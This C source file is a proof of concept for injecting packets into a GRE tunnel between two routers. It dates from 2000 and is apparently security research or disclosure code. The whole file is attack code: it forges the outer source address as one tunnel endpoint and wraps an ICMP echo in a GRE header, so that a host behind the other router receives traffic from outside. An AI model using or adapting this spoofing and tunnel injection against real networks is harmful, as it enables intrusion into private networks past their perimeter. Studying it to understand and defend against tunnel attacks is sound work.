/* GRE intrusion proof of concept
 * 
 * FX <fx@phenoelit.de>
 *
 * $Id: gre.c,v 1.1 2000/11/20 20:12:34 fx Exp fx $
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <fcntl.h>

#include "protocols.h"
#include "packets.h"

/* This is a very crapy test. 
 * We send a ping packet to VICTIM, intruding into the GRE tunnel between 
 * ROUTER A and ROUTER B. VICTIM is located behind ROUTER A.
 * This is done using the following information:
 * 	VICTIM's IP address
 * 	ROUTER A's
 * 		Outside IP 
 * 		Tunnel destination setting (probably ROUTER B)
 * 	ROUTER B's
 * 		Outside IP
 *
 * The packet is encapsulated in a IPv4 and GRE (RFC1701) header. Then it is 
 * send to ROUTER A with the sender address of ROUTER A's tunnel source
 * address (probably ROUTER B's outside IP). Then VICTIM should response to 
 * the ICMP echo and send it according to his default router to ROUTER A. The
 * source address of the encapsulated packet is our own IP. So, if ROUTER A
 * can reach us, he will send the packet back to us. If not, he will probably
 * send the packet to ROUTER B in GRE and he will send it to us.
 */
#define VICTIM		"10.1.1.2"
#define ROUTER_A	"192.168.1.12"
#define ROUTER_B	"192.168.1.10"

struct {
    struct in_addr 	router_a;
    struct in_addr	router_b;
    struct in_addr	victim;
} cfg;


int main(int argc, char **argv) {

    u_char	*packet;
    iphdr_t	*ip_gre,*ip_my;
    grehdr_t	*gre;
    icmp_ping_t	*ping;
    int		psize;
    int		socket;


    /* init a socket and fill packet_ifconfig */
    socket=init_socket_IP4("eth0",0);

    /* make the ip addresses */
    inet_aton(VICTIM,&(cfg.victim));
    inet_aton(ROUTER_A,&(cfg.router_a));
    inet_aton(ROUTER_B,&(cfg.router_b));

    /* build the outer packet */
    psize=sizeof(iphdr_t)*2
	+sizeof(grehdr_t)
	+sizeof(icmp_ping_t);
    packet=(u_char *)smalloc(psize+3);

    ip_gre=(iphdr_t *)packet;
    ip_gre->version=4;
    ip_gre->ihl=sizeof(iphdr_t)/4;
    ip_gre->tot_len=htons(psize);
    ip_gre->protocol=IPPROTO_GRE;
    ip_gre->id=htons(0xAFFE);		/* crap, but hey, it's a test */
    ip_gre->ttl=30;
    memcpy(&(ip_gre->saddr.s_addr),&(cfg.router_b.s_addr),IP_ADDR_LEN);
    memcpy(&(ip_gre->daddr.s_addr),&(cfg.router_a.s_addr),IP_ADDR_LEN);

    gre=(grehdr_t *)(packet+sizeof(iphdr_t));
    gre->flags=0;
    gre->proto=htons(0x0800);		/* IPv4 - see RFC1700 */

    ip_my=(iphdr_t *)(packet+sizeof(iphdr_t)+sizeof(grehdr_t));
    ip_my->version=4;
    ip_my->ihl=sizeof(iphdr_t)/4;
    ip_my->tot_len=htons(sizeof(iphdr_t)+sizeof(icmp_ping_t));
    ip_my->protocol=IPPROTO_ICMP;
    ip_my->id=htons(0xF0F0);
    ip_my->ttl=30;
    memcpy(&(ip_my->saddr.s_addr),
	    &(packet_ifconfig.ip.s_addr),IP_ADDR_LEN);
    memcpy(&(ip_my->daddr.s_addr),&(cfg.victim),IP_ADDR_LEN);
    /* we have to compute the checksum ourself, because there is no interface
     * that will do this for us */
    ip_my->check=chksum((u_char *)(ip_my),sizeof(iphdr_t));

    ping=(icmp_ping_t *)(packet+sizeof(iphdr_t)*2+sizeof(grehdr_t));
    ping->icmp.type=ICMP_ECHO;
    ping->echo.identifier=0x22;
    ping->icmp.checksum=chksum((u_char *)ping,sizeof(icmp_ping_t));


    /* send the test packet */

    sendpack_IP4(socket,packet,psize);
    close(socket);

    return 0;
}
